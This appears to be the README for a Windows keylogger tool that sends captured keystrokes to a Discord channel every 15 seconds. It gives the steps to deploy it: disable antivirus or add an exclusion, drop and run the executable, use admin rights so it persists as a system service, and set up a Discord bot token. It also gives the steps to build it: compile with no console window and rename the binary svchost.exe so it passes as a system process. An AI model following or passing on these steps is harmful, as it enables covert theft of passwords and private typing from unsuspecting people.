Known bugs
-
- The compiled executable has a tendency to get flagged by AV systems
    - Create an exclusion or turn off AV before running the keylogger executable

Usage/Deployment
-
Drop the compiled executable onto a Windows system and run it. If the program was run with admin rights,
it will create a system service to start it back up when the system restarts. Once the tool
starts, it will create a "Keyloggers" category on the joined server if it doesn't exist, and then
create a unique channel under this category for this specific keylogger instance. Every 15 seconds,
the tool running on the system will dump the keylogger buffer into this Discord channel.

Development Setup
-
This tool was built on Python 3.8
1. Clone the repo to your local system
2. `$ pip install pyWinhook-1.6.2-cp38-cp38-win32.whl`
3. `$ pip install -r requirements.txt`
4. Create a Discord application at https://discord.com/developers/applications
    - After creating an application, go to Bot, click Add Bot
    - Once the bot is created, click `Click to Reveal Token`, copy this value
    - In keylogger.py, replace `[REDACTED]` in `bot.run('[REDACTED]')` with your token
5. Invite the Discord bot to a server
    - **WARNING: The tool has issues when the bot is in more than one server**
    - Under the OAuth2 tab, click `bot` under SCOPES
    - In the BOT PERMISSIONS section, select the following:
        - Manage Channels
        - View Channels
        - Send Messages
    - In the SCOPES section, copy the OAuth2 URL into a new browser tab and follow the dialogs to add the bot to a server you control

Compiling the executable
-
1. Open a command prompt window in the project root 
2. `$ pyinstaller --noconsole keylogger.py`
3. The compiled binary should be under `./dist/keylogger/keylogger.exe`
4. Rename the `keylogger.exe` file to `svchost.exe`, as this is the name that the system service uses for the program
